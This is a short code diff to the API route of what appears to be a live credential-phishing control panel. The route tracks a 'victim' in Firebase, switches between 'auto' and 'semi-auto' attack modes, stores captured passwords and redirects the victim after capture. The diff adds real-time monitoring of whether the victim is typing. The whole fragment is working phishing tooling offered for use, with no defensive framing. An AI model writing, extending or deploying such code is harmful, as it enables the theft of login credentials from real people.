@@ -86,6 +86,7 @@ export async function GET(request: NextRequest) {
         profilePicture: appState.victim.profilePicture,
         errorMessage: appState.victim.errorMessage,
         redirectUrl: appState.config.redirectUrl,
+        isTyping: appState.victim.isTyping,
       });
     }
 
@@ -114,6 +115,10 @@ export async function POST(request: NextRequest) {
         // Reset victim state when mode is changed for a clean start
         await set(ref(db, 'victim'), initialState.victim);
         return NextResponse.json({ success: true, message: `Attack mode set to ${body.mode}` });
+      
+      case 'setTypingStatus':
+        await update(ref(db, 'victim'), { isTyping: body.isTyping });
+        return NextResponse.json({ success: true });
 
       case 'setVictimPage':
         await update(ref(db, 'victim'), { currentPage: body.page });
@@ -157,7 +162,7 @@ export async function POST(request: NextRequest) {
         };
         await firebasePush(passwordsRef, passwordEntry);
 
-        let victimUpdate: any = { attempts: newAttempts };
+        let victimUpdate: any = { attempts: newAttempts, isTyping: false };
 
         if (appState.config.attackMode === 'auto' || appState.config.attackMode === 'semi-auto') {
           victimUpdate.currentPage = 'redirect';
